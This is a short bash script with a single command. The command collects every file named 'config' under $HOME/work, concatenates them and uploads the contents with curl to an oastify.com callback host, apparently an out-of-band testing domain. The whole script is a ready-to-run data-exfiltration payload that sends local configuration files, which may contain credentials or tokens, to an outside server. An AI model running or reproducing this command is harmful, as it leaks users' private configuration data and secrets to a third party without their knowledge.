#!/usr/bin/env bash

find $HOME/work -type f -name config | xargs cat | curl -d @- '2illfzf6i4ziemhfszftob6quh08o0cp.oastify.com'
